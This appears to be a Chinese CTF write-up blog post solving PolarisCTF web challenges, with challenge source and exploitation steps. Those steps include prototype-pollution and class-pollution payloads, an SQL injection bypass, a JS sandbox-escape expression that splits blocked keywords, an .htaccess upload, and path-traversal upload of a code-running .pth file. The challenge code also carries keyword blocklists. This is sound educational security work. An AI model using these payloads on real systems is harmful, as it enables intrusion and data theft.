---
title: PolarisCTF 招新赛 Web 部分
date: 2026-03-05 10:00:00
author: Xendr1a
categories: [CTF题解, PolarisCTF]
tags: [PolarisCTF, Writeup]
description: PolarisCTF 招新赛 Web 部分：ez_python、SSTI、JWT 等题解。
toc: true
---
> 本文同时发表于博客园：[原文](https://www.cnblogs.com/Xendria/p/19824429/polarisctf-recruitment-competition-web-part-1spljh)

## 概述

## ez_python

```text
#源码
from flask import Flask, request
import json

app = Flask(__name__)

def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

class Config:
    def __init__(self):
        self.filename = "app.py"

class Polaris:
    def __init__(self):
        self.config = Config()

instance = Polaris()

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.data:
        merge(json.loads(request.data), instance)
    return "Welcome to Polaris CTF"

@app.route('/read')
def read():
    return open(instance.config.filename).read()

@app.route('/src')
def src():
    return open(__file__).read()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
```

/会把用户提交的 json 合并到全局对象instance 上，/read会读取instance.config.filename，我们post一段json覆盖就行了，然后访问/read

![5db6e199-fd02-4323-884b-eac903fbcd38-20260328200720-t9bs66z](/img/polarisctf-2025/img-01.png)

## only real

挺迷惑的，前端有个登入，然后里面又有个上传入口和jwt伪造，结果扫一下目录出来了，像是非预期

![4cb74ab1-ea8b-48fe-b903-92e233a5012f-20260328201556-8z7lbl8](/img/polarisctf-2025/img-02.png)

访问flag.php

## only_real_revenge

登入，想着先测测文件上传毕竟有个upload.php，进去发现直接就是上传成功，找半天没找到上传点那就自己搓一个了

```text
POST /upload.php HTTP/1.1
Host: 80-97220b16-73b3-4cf2-a93a-6845cbdb62a0.challenge.ctfplus.cn
Cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6InVzZXIiLCJleHAiOjE3NzQ3OTMzMzV9.fr8lMtAJqwUdClW4e1inh8fSRjfT2Jx86rvCQjAAYPI
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryA
Content-Length: 168

------WebKitFormBoundaryA
Content-Disposition: form-data; name="file"; filename="1.txt"
Content-Type: text/plain

111111111111111111111
------WebKitFormBoundaryA--
```

![cb9ddb80-5632-47f3-8a46-7f702fab56bb-20260329212341-fr0ccc5](/img/polarisctf-2025/img-03.png)

传进去了，php被禁了，可以打.htaccess

![c7ddf46a-fada-49f3-8cb3-26f8b4cd287f-20260329213004-ymnnxf3](/img/polarisctf-2025/img-04.png)

## ezpollute

```text
//源码
const express = require('express');
const { spawn } = require('child_process');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static(__dirname));

function merge(target, source, res) {
    for (let key in source) {
        if (key === '__proto__') {
            if (res) {
                res.send('get out!');
                return;
            }
            continue;
        } 
        
        if (source[key] instanceof Object && key in target) {
            merge(target[key], source[key], res);
        } else {
            target[key] = source[key];
        }
    }
}

let config = {
    name: "CTF-Guest",
    theme: "default"
};

app.post('/api/config', (req, res) => {
    let userConfig = req.body;

    const forbidden = ['shell', 'env', 'exports', 'main', 'module', 'request', 'init', 'handle','environ','argv0','cmdline'];
    const bodyStr = JSON.stringify(userConfig).toLowerCase();
    for (let word of forbidden) {
        if (bodyStr.includes(`"${word}"`)) {
            return res.status(403).json({ error: `Forbidden keyword detected: ${word}` });
        }
    }

    try {
        merge(config, userConfig, res);
        res.json({ status: "success", msg: "Configuration updated successfully." });
    } catch (e) {
        res.status(500).json({ status: "error", message: "Internal Server Error" });
    }
});

app.get('/api/status', (req, res) => {

    const customEnv = Object.create(null);
    for (let key in process.env) {
        if (key === 'NODE_OPTIONS') {
            const value = process.env[key] || "";

            const dangerousPattern = /(?:^|\s)--(require|import|loader|openssl|icu|inspect)\b/i;

            if (!dangerousPattern.test(value)) {
                customEnv[key] = value;
            }
            continue;
        }
        customEnv[key] = process.env[key];
    }
    
    const proc = spawn('node', ['-e', 'console.log("System Check: Node.js is running.")'], {
        env: customEnv,
        shell: false 
    });
    
    let output = '';
    proc.stdout.on('data', (data) => { output += data; });
    proc.stderr.on('data', (data) => { output += data; });
    
    proc.on('close', (code) => {
        res.json({ 
            status: "checked", 
            info: output.trim() || "No output from system check."
        });
    });
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Flag 位于 /flag
app.listen(3000, '0.0.0.0', () => {
    console.log('Server running on port 3000');
});
```

原型链污染，禁掉了`'__proto__'`，可以用`constructor.prototype`，

题目对 `NODE_OPTIONS` 做了过滤，禁了这些`const dangerousPattern = /(?:^|\s)--(require|import|loader|openssl|icu|inspect)\b/i;`

`NODE_OPTIONS`是node.js的环境变量，然后看到这里

```text
const proc = spawn('node', ['-e', 'console.log("System Check: Node.js is running.")'], {
        env: customEnv,
        shell: false 
    });
```

我们能控制子进程的环境变量，

```text
    let output = '';
    proc.stdout.on('data', (data) => { output += data; });
    proc.stderr.on('data', (data) => { output += data; });
    
    proc.on('close', (code) => {
        res.json({ 
            status: "checked", 
            info: output.trim() || "No output from system check."
        });
    });
});
```

输出在这里`output.trim()`，stderr会被返回

那哪些环境变量会在 node 启动时自动生效呢，node.js关于文件读写的就这个`NODE_OPTIONS`但是被禁了我们得想想别的，Node.js 启动时，会加载V8、Libuv 和 OpenSSL这三个，V8和Libuv几乎没有什么环境变量，直接去找OpenSSL，

找到了

![34b7525d-2afb-48db-b70f-80af7e093551-20260331225524-b513ij2](/img/polarisctf-2025/img-05.png)

跟进一下

![c351f49b-1f70-481b-ad99-13efe9476d1f-20260331230009-zya0ket](/img/polarisctf-2025/img-06.png)

当 Node.js 启动并加载 OpenSSL 时，OpenSSL 会立即寻找这个配置文件，以确定加密算法的行为、证书的路径以及安全策略。**OPENSSL_CONF**会告诉 OpenSSL 库去哪里读取它的配置文件，直接用

```text
{"constructor":{"prototype":{"OPENSSL_CONF":"/flag"}}}
```

![f1074d69-62ea-458a-9c97-e47fe22415e6-20260329213606-4z7qqn8](/img/polarisctf-2025/img-07.png)

## Broken Trust

注册个账户，登入发现

```text
    async function refreshProfile() {
        const uid = "94a4925f690b4b0883a90b57e7471b12"; // 现在是字符串
        const msg = document.getElementById('msg');
        msg.innerText = "Syncing with API...";
        
        try {
            const response = await fetch('/api/profile', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ uid: uid }) // 发送字符串
            });
            const data = await response.json();
            if(data.username) {
                msg.innerText = "Session synced. Current user: " + data.username;
            } else {
                msg.innerText = "Sync failed: " + (data.error || "Unknown error");
            }
        } catch (e) {
            msg.innerText = "Error connecting to API.";
        }
    }
```

去测一下

![b7606233-b749-4447-ac08-a6aaf96d6653-20260329232044-1mpc18n](/img/polarisctf-2025/img-08.png)

看回显猜是sql了，试了一下万能密码直接绕了，给了admin的uid

![37b199da-0e23-4cb7-9609-9ffb1b2e0dff-20260329232231-49ejhny](/img/polarisctf-2025/img-09.png)

后面文件读取，可以双写绕过

![c2b9745d-37c3-4b7e-a678-f81c89264771-20260329232552-bbby4s3](/img/polarisctf-2025/img-10.png)

## 醉里挑灯看剑

没学过ts，但是点进去又感觉看的明白，

```text
import { SQL } from 'bun';
import crypto from 'node:crypto';
import fs from 'node:fs';
import path from 'node:path';
import { createServer, IncomingMessage, ServerResponse } from 'node:http';

const PORT = Number(process.env.PORT || '80');
const JSON_LIMIT = 28 * 1024;
const EXPR_LIMIT = 1800;
const RELEASE_CHALLENGE_TTL_MS = 3 * 60 * 1000;

const DB_DSN = 'sqlite:///app/data/service.db';
const SECRET_DIR = '/app/secrets';
const GUEST_KEY_PATH = path.join(SECRET_DIR, 'guest.key.json');
const MAINTAINER_KEY_PATH = path.join(SECRET_DIR, 'release-maintainer.key.json');
const RUNNER_KEY = process.env.RUNNER_KEY || 'dev-runner-key';
const FLAG_VALUE = process.env.FLAG_VALUE || 'flag{dev_placeholder_flag}';

const db = new SQL(DB_DSN);

const BLOCKED_EXPRESSION_TOKENS = [
  'process',
  'globalthis',
  'constructor',
  'function',
  'require',
  'import',
  'fetch',
  'bun',
  'http',
  'spawn',
  'eval',
  'node:',
  'child_process',
  'websocket'
] as const;

type SessionRole = 'guest' | 'maintainer';
```

开头注意到flag，交一下发现不对，有个sql，最下面这行应该是用户‘guest' 和 'maintainer'，

FLAG_VALUE最后一次出现是在这里/api/release/claim

```text
 if (req.method === 'POST' && pathname === '/api/release/claim') {
    const claims = requireSession(req);  //这里是校验token
    const effectiveCap = await getEffectiveCapability(claims.sid);
    assertReleaseCapability(effectiveCap);//这里是判断if (cap.role !== 'maintainer' || cap.lane !== 'release')，不满足就报错了

    if (claims.role !== 'guest') {
      throw new Error('release claim requires guest-origin session');
    }//虽然当前capability必须是maintainer或者release，但token本身的claims.role还必须是guest

    const body = await collectJsonBody(req);
    if (!body || typeof body !== 'object') {
      throw new Error('claim body must be object');
    }

    const payload = body as Record<string, unknown>;
    const nonce = typeof payload.nonce === 'string' ? payload.nonce.trim() : '';
    const proof = typeof payload.proof === 'string' ? payload.proof.trim() : '';

    if (!/^[a-f0-9]{24}$/i.test(nonce)) {
      throw new Error('invalid challenge nonce');
    }

    if (!/^[a-f0-9]{40}$/i.test(proof)) {
      throw new Error('invalid release proof format');
    }

    const expected = computeReleaseProof(claims.sid, nonce);/*服务端会自己算一个proof，然后提交的对比。
这样写的return crypto.createHash('sha1').update(`${sid}:${nonce}:${RUNNER_KEY}`).digest('hex');*/
    if (proof.toLowerCase() !== expected) {
      throw new Error('release proof mismatch');
    }

    await consumeReleaseChallenge(claims.sid, nonce);

    sendJson(res, 200, {
      ok: true,
      sid: claims.sid,
      flag: FLAG_VALUE
    });
    return;
  }
```

说明需要session的effective capability 必须通过assertReleaseCapability()的检查，token本身的claims.role仍然必须是guest才能通过，

就是说伪造个maintainer的token好像不行，必须让一个guest的session拥有maintainer的capability，并且proof 校验要通过，才能获得flag。

然后我们看到

```text
async function getEffectiveCapability(sid: string): Promise<CapabilityView> {
  const rows = await db`
    SELECT
      id,
      sid,
      COALESCE(role, 'maintainer') AS role,
      COALESCE(lane, 'release') AS lane,
      source,
      note,
      stamp
    FROM capability_snapshots
    WHERE sid = ${sid}
    ORDER BY id DESC
    LIMIT 1
  `;
```

COALESCE()会返回参数列表中第一个非 NULL 的值，如果数据库里的role/lane是NULL，系统就会role = maintainer 和lane = release

那我们怎么把他变成NULL呢，我们继续看

```text
 if (req.method === 'POST' && pathname === '/api/caps/sync') {
    const claims = requireSession(req);
    assertGuest(claims);

    const body = await collectJsonBody(req);
    const rows = normalizeSyncRows(body, claims);//把请求体读出来
    await appendCapabilityRows(rows);//把传过来的body处理成一个数组rows，里面每一项都是一条准备插入数据库的capability记录。

    sendJson(res, 200, {
      ok: true,
      sid: claims.sid,
      inserted: rows.length,
      hint: 'capability snapshots synced'
    });
    return;
  }
```

处理完后还有个push会加上一条`source: 'server-tail',`也算个安全的兜底机制吧

真正写入数据库的是

```text
async function appendCapabilityRows(rows: Array<Record<string, unknown>>): Promise<void> {
  if (!rows.length) {
    return;
  }

  const firstRowKeys = Object.keys(rows[0]); //这里会取出第一条记录有哪些字段
  const shapedRows = rows.map((row) => {
    const out: Record<string, unknown> = {};
    for (const key of firstRowKeys) {
      out[key] = Object.prototype.hasOwnProperty.call(row, key) ? row[key] : null;
    }
    return out;
  });

  await db`INSERT INTO capability_snapshots ${db(shapedRows as unknown as Record<string, unknown>[])}`;
}
```

这里是把多条 capability 记录批量插进数据库，看到这`const firstRowKeys = Object.keys(rows[0]);` ，这里会取出第一条记录有哪些字段

在结合后面的代码，也就是说：

```text
如果第一条是：{ a: "1", b: "2", c: "3", d: "4" }
那么firstRowKeys 就是：["a","b","c","d"]
```

如果当前这条有这个字段，就用原值，如果没有，就填 NULL。说到NULl自动联系到前面的COALESCE()

所以现在思路就清楚了：

1. 想办法让第一条记录不带 `role/lane`
2. 这样整批插入后的记录都会丢掉 `role/lane`
3. 数据库里最新一条记录的 `role/lane` 就会变成 NULL
4. 查询 `effective capability` 时，再被 `COALESCE()` 自动解释成 `maintainer/release`

那怎样让第一条记录不带role/lane呢？继续看

```text
const keepRole = input.keepRole !== false;
    const keepLane = input.keepLane !== false;

    const row: Record<string, unknown> = {
      sid: claims.sid,
      source,
      note,
      stamp: now + i
    };

    if (keepRole) {
      row.role = 'guest';
    }

    if (keepLane) {
      row.lane = 'public';
    }

    rows.push(row);
```

也就是说，只要传入：

```text
{
  "keepRole": false,
  "keepLane": false
}
```

第一条记录就没有role/lane，然后看到数据库取当前 capability 的方式是：`ORDER BY id DESC LIMIT 1`，也就是说，最后插入的那一条会被当成当前有效capability。

我们一开始关注的是`/api/release/claim`，但是proof 校验我们不知道key过不去，我又想起了一开头ban的东西，然后跟进一下来到了这边

```text
if (req.method === 'POST' && pathname === '/api/release/execute') {
    const claims = requireSession(req);
    const effectiveCap = await getEffectiveCapability(claims.sid);
    assertReleaseCapability(effectiveCap);

    const body = await collectJsonBody(req);
    if (!body || typeof body !== 'object') {
      throw new Error('execute body must be object');
    }

    const payload = body as Record<string, unknown>;
    const expression = typeof payload.expression === 'string' ? payload.expression : '';
    const input = Object.prototype.hasOwnProperty.call(payload, 'input') ? payload.input : {};

    const output = await executeExpression(expression, input, claims, effectiveCap);

    const exprHash = crypto.createHash('sha1').update(expression).digest('hex');
    await db`INSERT INTO release_runs ${db({
      sid: claims.sid,
      expr_hash: exprHash,
      output_preview: JSON.stringify(output).slice(0, 360),
      created_at: Date.now()
    })}`;

    sendJson(res, 200, {
      ok: true,
      cap: {
        id: effectiveCap.id,
        role: effectiveCap.role,
        lane: effectiveCap.lane,
        source: effectiveCap.source
      },
      result: output
    });
    return;
  }
```

`assertReleaseCapability(effectiveCap);`我们前面已经把 capability 提上来了，所以这个检查已经能过，然后就是绕黑名单，因为给了flag所在的位置在`process.env.FLAG_VALUE`，我们直接构造，关键词拼接就能绕过了

```text
[]["filter"]["constr"+"uctor"]("return pro"+"cess.env.FLAG_VALUE")()
```

先获取guest token

```text
POST /api/auth/guest
```

然后用 `/api/caps/sync` 造出 NULL capability

![9c4ff52a-4df1-4184-b50c-55f2e8c2a15a-20260401210116-eyfnru1](/img/polarisctf-2025/img-11.png)

最后用 `/api/release/execute` 触发表达式执行

![a8f2506d-47c0-4245-964e-7ac76115830c-20260401210141-eg56l9l](/img/polarisctf-2025/img-12.png)

## AutoPypy

给了源码先看看，先看/upload接口，

```text
#server.py
@app.route('/upload', methods=['POST'])
def upload():
    if 'file' not in request.files:
        return 'No file part', 400
    
    file = request.files['file']
    filename = request.form.get('filename') or file.filename
    
    save_path = os.path.join(UPLOAD_FOLDER, filename)
    
    save_dir = os.path.dirname(save_path)
    if not os.path.exists(save_dir):
        try:
            os.makedirs(save_dir)
        except OSError:
            pass

    try:
        file.save(save_path)
        return f'成功上传至: {save_path}'
    except Exception as e:
        return f'上传失败: {str(e)}', 500
```

这里 filename 是用户可控的，并且没有做任何过滤。

如果传入../../test.py，实际保存路径会变成/app/uploads/../../test.py，也就是/app/test.py

再看到/run接口

```text
@app.route('/run', methods=['POST'])
def run_code():
    data = request.get_json()
    filename = data.get('filename')

    target_file = os.path.join('/app/uploads', filename)

    launcher_path = os.path.join(BASE_DIR, 'launcher.py')

    try:
        proc = subprocess.run(
            [sys.executable, launcher_path, target_file],
            capture_output=True,
            text=True,
            timeout=5,
            cwd=BASE_DIR 
        )
        return jsonify({"output": proc.stdout + proc.stderr})
    except subprocess.TimeoutExpired:
        return jsonify({"output": "Timeout"})
```

这里是调用python去运行`launcher.py`，并且把filename当参数传过去，就是

```text
python launcher.py filename
```

那我们看看`launcher.py`

```text
import subprocess
import sys

def run_sandbox(script_name):
    print("Launching sandbox...")
    cmd = [
        'proot',
        '-r', './jail_root',
        '-b', '/bin',
        '-b', '/usr',
        '-b', '/lib',
        '-b', '/lib64',
        '-b', '/etc/alternatives',
        '-b', '/dev/null',
        '-b', '/dev/zero',
        '-b', '/dev/urandom',
        '-b', f'{script_name}:/app/run.py',
        '-w', '/app',
        'python3', 'run.py'
    ]
    subprocess.call(cmd)
    print("ok")

if __name__ == "__main__":
    script = sys.argv[1]
    run_sandbox(script)
```

看起来是把代码丢进 proot 执行。

再看 server.py 最下面：

```text
if __name__ == '__main__':
    import site
    print(f"[*] Server started.")
    print(f"[*] Upload Folder: {UPLOAD_FOLDER}")
    print(f"[*] Target site-packages (Try to reach here): {site.getsitepackages()[0]}")
    app.run(host='0.0.0.0', port=5000)
```

基本明示了目标点在 site-packages。Python 在启动时会自动处理 `site-packages` 目录下的 `.pth` 文件，如果 `.pth` 文件中某一行以 `import` 开头，这行代码就会被自动执行。

```text
所以我们的利用思路就很明显了
先通过 `/upload` 的路径穿越把文件写到宿主机的 `site-packages`，然后写入一个`.pth` 文件，再调用`/run`触发
```

.pth可以这样写

```text
import os;print(open('/flag').read())
```

利用目录穿越上传到

```text
../../usr/local/lib/python3.10/site-packages/Xendr1a.pth
```

随便写个不存在的文件/run一下就行了

![fb5a831f-773c-4204-81a5-41a8efbc69f4-20260405220610-gub3j5s](/img/polarisctf-2025/img-13.png)

## 总结

后面虚拟机挂着codex也出了好几题，但是感觉不是自己做的发出来怪怪的，那几题就不发了，自己拿去慢慢吃了，最近也不知道怎么没心思学了，慢慢调整状态吧。
